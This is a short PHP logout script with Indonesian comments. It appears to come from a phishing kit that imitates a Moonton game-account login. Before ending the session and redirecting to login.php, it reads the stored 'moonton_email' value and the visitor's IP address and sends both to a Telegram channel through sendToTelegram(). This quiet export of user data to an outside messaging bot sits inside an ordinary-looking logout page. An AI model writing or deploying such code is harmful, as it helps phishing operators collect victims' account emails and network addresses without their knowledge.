<?php
session_start();
include 'includes/functions.php';

// Log logout
if (isset($_SESSION['moonton_email'])) {
    $ip = getUserIP();
    sendToTelegram("Logout - User: {$_SESSION['moonton_email']} | IP: $ip");
}

// Hapus semua data session
session_unset();
session_destroy();

// Redirect ke halaman login
header("Location: login.php");
exit;
?>
